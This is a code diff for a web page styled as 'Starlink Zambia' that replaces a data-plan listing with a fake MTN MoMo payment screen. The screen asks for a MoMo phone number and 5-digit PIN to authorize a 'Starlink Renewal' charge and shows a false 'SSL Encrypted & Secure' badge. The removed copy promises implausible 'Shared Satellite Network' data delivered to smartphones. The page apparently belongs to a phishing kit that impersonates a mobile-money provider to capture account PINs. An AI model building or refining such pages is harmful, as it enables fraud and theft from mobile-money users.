@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
   <meta name="theme-color" content="#000000">
-  <title>Plans - Starlink Zambia</title>
+  <title>MTN MoMo - Starlink Zambia</title>
   <link rel="stylesheet" href="assets/css/tokens.css">
   <link rel="stylesheet" href="assets/css/base.css">
   <link rel="stylesheet" href="assets/css/components.css">
@@ -23,30 +23,73 @@
 
     <main class="app-content">
 
-      <section class="hero-card">
-        <h1 class="hero-card__title">High-Speed Internet</h1>
-        <p class="hero-card__body">
-          Experience the future of connectivity with our
-          <strong>Shared Satellite Network</strong>. Using advanced
-          <strong>Crowdsourcing Technology</strong>, we deliver
-          high-speed Starlink data directly to your smartphone,
-          anywhere in Zambia. Choose your plan and join the network
-          instantly using <strong>MTN MoMo</strong>.
-        </p>
+      <section class="card card--flush" aria-labelledby="momo-title">
+        <header class="momo-header">
+          <div class="momo-header__logo" aria-hidden="true">MoMo</div>
+          <h1 class="momo-header__title" id="momo-title">MTN MoMo</h1>
+        </header>
+
+        <div style="padding: var(--space-5);" class="stack">
+          <div class="amount-block">
+            <p class="amount-block__label">Amount</p>
+            <p class="amount-block__value" id="amount-value">ZMW 45.00</p>
+            <p class="amount-block__service-label">Service</p>
+            <p class="amount-block__service">Starlink Renewal</p>
+          </div>
+
+          <p class="page-subtitle" style="text-align:center;">
+            Enter your MTN MoMo details to authorize
+          </p>
+
+          <div class="field">
+            <label class="field__label" for="phone">MTN MoMo Number</label>
+            <div class="field__control">
+              <span class="field__prefix">
+                <span aria-hidden="true">&#127885;</span>
+                <span>+260</span>
+              </span>
+              <input class="field__input" id="phone" name="phone"
+                     type="tel" inputmode="numeric"
+                     autocomplete="tel-national"
+                     placeholder="77xxxxxxx" maxlength="9">
+            </div>
+          </div>
+
+          <div class="field">
+            <label class="field__label" for="pin">Enter PIN</label>
+            <input class="pin-input" id="pin" name="pin"
+                   type="password" inputmode="numeric"
+                   autocomplete="one-time-code"
+                   maxlength="5" pattern="[0-9]*"
+                   placeholder="&#8226;&#8226;&#8226;&#8226;&#8226;"
+                   aria-describedby="pin-hint">
+            <p class="field__hint" id="pin-hint"
+               style="text-align:center;">enter 5 digits</p>
+          </div>
+
+          <button type="button" class="btn btn--yellow"
+                  id="confirm-payment" disabled>
+            <svg class="btn__icon" viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="2"
+                 stroke-linecap="round" stroke-linejoin="round"
+                 aria-hidden="true">
+              <circle cx="12" cy="12" r="10"/>
+              <path d="m9 12 2 2 4-4"/>
+            </svg>
+            <span>Confirm Payment</span>
+          </button>
+
+          <p class="trust">
+            <svg class="trust__icon" viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="2"
+                 stroke-linecap="round" stroke-linejoin="round"
+                 aria-hidden="true">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z"/>
+            </svg>
+            <span>SSL Encrypted &amp; Secure</span>
+          </p>
+        </div>
       </section>
-
-      <h2 class="section-heading">
-        <svg class="section-heading__icon" viewBox="0 0 24 24"
-             fill="none" stroke="currentColor" stroke-width="2"
-             stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-          <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/>
-          <path d="M3 6h18"/>
-          <path d="M16 10a4 4 0 0 1-8 0"/>
-        </svg>
-        <span>Select Your Plan</span>
-      </h2>
-
-      <div id="plan-list" class="stack"></div>
 
     </main>
 
@@ -96,23 +139,10 @@
       </a>
     </nav>
 
-    <!-- MoMo redirect loader (shown after a plan is tapped) ----------- -->
-    <div class="overlay" id="momo-loader" hidden>
-      <div class="loader-card" role="status" aria-live="polite">
-        <div class="loader-spinner" aria-hidden="true"></div>
-        <div class="loader-card__logo" aria-hidden="true">MoMo</div>
-        <h2 class="loader-card__title">Processing...</h2>
-        <p class="loader-card__body">
-          Securely redirecting to MTN MoMo payment gateway
-        </p>
-        <p class="loader-card__footnote">Please do not refresh the page</p>
-      </div>
-    </div>
-
   </div>
 
   <script src="assets/js/data/copy.js"></script>
   <script src="assets/js/data/plans.js"></script>
-  <script src="assets/js/pages/plans.js"></script>
+  <script src="assets/js/pages/checkout.js"></script>
 </body>
 </html>
